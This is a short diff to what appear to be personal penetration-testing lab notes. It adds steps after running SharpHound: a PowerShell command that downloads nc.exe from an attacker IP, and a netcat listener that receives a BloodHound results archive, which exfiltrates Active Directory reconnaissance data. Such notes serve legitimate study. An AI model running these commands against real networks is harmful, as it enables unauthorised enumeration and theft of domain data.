@@ -132,7 +132,15 @@ Starting sharphound
 .\sharp.exe --CollectionMethods All
 ```
 
-Trying to extr
+Trying to extract bloodhound results with nc
+
+``` powershell
+iwr -uri "http://192.168.45.228:8888/nc.exe" -outfile "C:\Users\joe\Downloads\nc.exe"
+```
+
+```powershell
+.\nc.exe -l -p 4444>20231231101949_BloodHound.zip
+```
 
 
 
